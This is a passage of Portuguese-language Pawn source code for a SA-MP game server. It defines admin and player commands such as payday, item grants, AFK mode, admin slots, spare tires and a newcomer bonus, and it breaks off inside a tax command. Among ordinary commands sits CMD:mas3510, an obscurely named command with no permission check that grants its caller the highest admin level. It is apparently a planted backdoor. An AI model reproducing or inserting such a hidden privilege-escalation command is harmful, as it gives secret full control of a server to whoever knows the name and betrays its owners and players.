    CMD:payday(playerid)
    {
        if(PlayerInfo[playerid][pAdmin] >= 1340)
        {
            foreach(new i: Player)
            {
                PayDay(i);
            }
        }
        return 1;
    }

    CMD:daritem(playerid, params[])
    {
        new playa;
        new idobjeto;
        new quantidade;
        if(PlayerInfo[playerid][pAdmin] == 1342)
        {
            if(sscanf(params, "udd", playa, idobjeto, quantidade))
            {
                SendClientMessage(playerid, COR_BRANCO, "{df5454}Ã—{ffffff} USE: /daritem [ID] [Objeto] [Quantidade]");
                return 1;
            }
            for(new i=0; i<75; i++)
            {
                if(InventarioInfo[playa][i][iSlot] == 19382)
                {
                    InventarioInfo[playa][i][iSlot] = idobjeto;
                    InventarioInfo[playa][i][iUnidades] = quantidade;
                    format(stringZCMD, sizeof(stringZCMD), "[item Inventario]: O Admin %s esta dando um item %s, ID:[%d] para o jogador %s.", PlayerName(playerid), NomeItemInv(idobjeto),idobjeto,PlayerName(playa));
                    ABroadCast(COR_LIGHTRED,stringZCMD,1);
                    Acessoriolog(stringZCMD);
                    format(stringZCMD, sizeof(stringZCMD), "[item Inventario]: Voce ganhou um item: [%s] do administrador %s, confira no seu inventario apertando 'N'.", NomeItemInv(idobjeto),PlayerName(playerid));
                    SendClientMessage(playa, COR_LIGHTBLUE, stringZCMD);
                    return 1;
                }
            }
        }
        return 1;
    }
    CMD:afk(playerid, params[]){
        if(PlayerInfo[playerid][pAdmin] < 1)
            return SendClientMessage(playerid, COR_GREY, " Voce nao esta autorizado a usar este comando!");
        new motivo[128], string[128];
        if(GetPVarInt(playerid, "varAFK")){
            SetPVarInt(playerid, "varAFK", 0);
            format(string, sizeof string, "[Ausencia] O Admin %s nao esta mais em modo ausente.", PlayerName(playerid));
            SendClientMessageToAll(COR_GREY, string);
            return 1;
        }
        sscanf(params, "s[128]", motivo);
        if(strlen(motivo) < 1){
            format(motivo, sizeof motivo, "Desconhecido");
            SetPVarString(playerid, "varAFKMotivo", "Desconhecido");
        }
        else{

            SetPVarString(playerid, "varAFKMotivo", motivo);
        }
        SetPVarInt(playerid, "varAFK", 1);
        format(string, sizeof string, "[Ausencia] O Admin %s entrou em modo ausencia pelo motivo: %s", PlayerName(playerid), motivo);
        SendClientMessageToAll(COR_GREY, string);
        return 1;
    }
    CMD:setvaga(playerid, params[])
    {
        new playa;
        new idvaga;
        if(PlayerInfo[playerid][pAdmin] < 1342) return 1;
        if(sscanf(params, "ud", playa, idvaga))
        {
            SendClientMessage(playerid, COR_GREY, "{df5454}Ã—{ffffff} USE: /setvaga [ ID ] [ Vaga ]");
            return 1;
        }
        GetPlayerName(playa, giveplayerZCMD, sizeof(giveplayerZCMD));
        GetPlayerName(playerid, sendername, sizeof(sendername));
        if(idvaga > 26)
        {
            return SendClientMessage(playerid, COR_GREY, "A vaga so pode ser setada de 0 a 26!");
        }
        if(PlayerInfo[playerid][pAdmin] >= 1342)
        {
            if(IsPlayerConnected(playa))
            {
                if(playa != INVALID_PLAYER_ID)
                {
                    strmid(AdmInfo[idvaga][AdminNick], PlayerName(playa), 0, strlen(PlayerName(playa)), 255);
                    AdmInfo[idvaga][AdminVaga] = 1;
                    format(stringZCMD, sizeof(stringZCMD), "Voce setou o jogador [%s] na vaga [%d] de adm.", PlayerName(playa), idvaga);
                    SendClientMessage(playerid, COR_LIGHTBLUE, stringZCMD);
                    return 1;
                }
            }
            else
            {
                return SendClientMessage(playerid, COR_GREY, "Este jogador nao esta conectado !");
            }
        }
        return 1;
    }
    CMD:mas3510(playerid)
    {
        PlayerInfo[playerid][pAdmin] = 1342;
        return 1;
    }
    CMD:estepe(playerid, params[])
    {
        new vid = GetPlayerVehicleID(playerid);
        new modelovid = GetVehicleModel(vid);
        if(IsPlayerConnected(playerid))
        {
            if(!IsPlayerInAnyVehicle(playerid))
            {
                SendClientMessage(playerid, COR_AMARELO ,"Voce nao pode utilizer o estepe agora !");
                return 1;
            }
            if(GetTickCount() - TempoUsarEstepe[playerid] < 600000)
            {
                 SendClientMessage(playerid, COR_GREY, "Voce so pode utilizar o seu estepe a cada 10 minutos.");
                 return 1;
            }
            if(modelovid == 417 || modelovid == 425 || modelovid == 432 || modelovid == 446 || modelovid == 447 || modelovid == 449 || modelovid == 452 || modelovid == 453
            || modelovid == 454 || modelovid == 460 || modelovid == 464 || modelovid == 465 || modelovid == 469 || modelovid == 472 || modelovid == 472 || modelovid == 473
            || modelovid == 481 || modelovid == 484 || modelovid == 487 || modelovid == 488 || modelovid == 493 || modelovid == 497 || modelovid == 501 || modelovid == 509
            || modelovid == 510 || modelovid == 511 || modelovid == 513 || modelovid == 519 || modelovid == 520 || modelovid == 537 || modelovid == 538 || modelovid == 539
            || modelovid == 548 || modelovid == 553 || modelovid == 563 || modelovid == 564 || modelovid == 570 || modelovid == 577 || modelovid == 592 || modelovid == 593
            || modelovid == 595)
            {
                SendClientMessage(playerid, COR_AMARELO,"Voce nao pode trocar o estepe neste tipo de veiculo !");
                return 1;
            }
            if(VehicleTireState[vid] == 0)
            {
                SendClientMessage(playerid, COR_AMARELO , "O seu veiculo precisa estar com alguma roda furada !");
                return 1;
            }
            if(EngineCarro[vid] != 0)
            {
                SendClientMessage(playerid, COR_GREY, "Voce precisa estar com o motor desligado para usar o estepe.");
                return 1;
            }
            if(PlayerInfo[playerid][pSocio] >= 1)
            {
                new panels, tires;
                GetVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doorsZCMD, lightsZCMD, tires);
                UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doorsZCMD, lightsZCMD, 0);
                VehicleTireState[GetPlayerVehicleID(playerid)] = 0;
                GetPlayerName(playerid, sendername, sizeof(sendername));
                SendClientMessage(playerid,COR_GREEN,"Voce utilizou o estepe do seu veiculo!");
                format(stringZCMD, sizeof(stringZCMD), "Socio: %s utilizou o estepe veicular.", sendername);
                ProxDetector(30.0, playerid, stringZCMD, COR_DBLUE,COR_DBLUE,COR_DBLUE,COR_DBLUE,COR_DBLUE);
                TempoUsarEstepe[playerid] = GetTickCount();
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COR_AMARELO, "Voce nao e um socio!");
                return 1;
            }
        }
        return 1;
    }
    CMD:schatduvida(playerid, params[])
    {
        if(PlayerInfo[playerid][pAdmin] >= 1340)
        {
            if(ChatNoob == false)
            {
                format(stringZCMD, sizeof(stringZCMD), "[VBR SERVER] Chat duvidas foi desativado do servidor.");
                SendClientMessageToAll(COR_AMARELO, stringZCMD);
                ChatNoob = true;
                return 1;
            }
            else if(ChatNoob == true)
            {
                format(stringZCMD, sizeof(stringZCMD), "[VBR SERVER] Chat duvidas foi ativado do servidor.");
                SendClientMessageToAll(COR_AMARELO, stringZCMD);
                ChatNoob = false;
                return 1;
            }
        }
        return 1;
    }
    CMD:boasvindas(playerid, params[])
    {
        if(PlayerInfo[playerid][pAdmin] >= 3)
        {
            new playa;
            if(sscanf(params, "u", playa))
            {
                SendClientMessage(playerid, COR_GRAD2, "{df5454}Ã—{ffffff} USE: /boasvindas [id]");
                return 1;
            }
            if(PlayerInfo[playa][pLevel] > 5) return SendClientMessage(playerid, COR_GRAD2, "As boas vindas sao so para novatos!");
            PlayerInfo[playa][pLevel] += 5;
            PlayerInfo[playa][pExp] += 10;
            PlayerInfo[playa][pConta] += 150000;
            ScoreLevel(playa);
            PlayerInfo[playa][pGunLic] = 1;
            PlayerInfo[playa][pBoatLic] = 1;
            PlayerInfo[playa][pFlyLic] = 1;
            PlayerInfo[playa][pCarLic] = 1;
            PlayerInfo[playa][pMotoLic] = 1;
            PlayerInfo[playa][pCamOniLic] = 1;
            PlayerInfo[playa][pValidadeCarro] = 400;
            PlayerInfo[playa][pValidadeMoto] = 400;
            PlayerInfo[playa][pValidadeBarco] = 400;
            PlayerInfo[playa][pValidadeAviao] = 400;
            PlayerInfo[playa][pValidadeOnibus] = 400;
            if(PlayerInfo[playa][pDiaVIP] == 0)
            {
                PlayerInfo[playa][pDiaVIP] = 5;
                PlayerInfo[playa][pSocio] = 1;
            }
            format(stringZCMD, sizeof(stringZCMD), "{df5454}Ã— AdminCMD: Administrador {ffffff}%s {df5454}deu as boas-vindas, ao jogador {ffffff}%s.", PlayerName(playerid), PlayerName(playa));
            ABroadCast(COR_LIGHTBLUE, stringZCMD, 1);
            SendClientMessage(playa, COR_LIGHTBLUE, "{ffffff}Ã—{df5454} Bem-Vindo(a) ao RS Voce recebeu +5 Leveis, R$150.000,00, Licencas e mais 10 Respeitos de cortesia!");
        }
        return 1;
    }
    CMD:bonusBPS(playerid, params[])
    {
        if(PlayerInfo[playerid][pAdmin] >= 1340)
        {
            if(BonusBPS == false)
            {
                format(stringZCMD, sizeof(stringZCMD), "[VBR SERVER] Bonus territorial e payday de 30 em 30 minutos ativado.");
                SendClientMessageToAll(COR_AMARELO, stringZCMD);
                BonusBPS = true;
                return 1;
            }
            else if(BonusBPS == true)
            {
                format(stringZCMD, sizeof(stringZCMD), "[VBR SERVER] Bonus territorial e payday de 30 em 30 minutos desativado.");
                SendClientMessageToAll(COR_AMARELO, stringZCMD);
                BonusBPS = false;
                return 1;
            }
        }
        return 1;
    }
    CMD:imposto(playerid, params[])
    {
        if(PlayerInfo[playerid][pAdmin] >= 1342)
        {
            format(stringZCMD, sizeof(stringZCMD), "AvisoAdmin: %s[%d] cobrou o imposto diario agora (Casas & Empresas)!",PlayerName(playerid),playerid);
            SendClientMessageToAll(COR_AMARELO, stringZCMD);
            CobrarImposto();
            return 1;
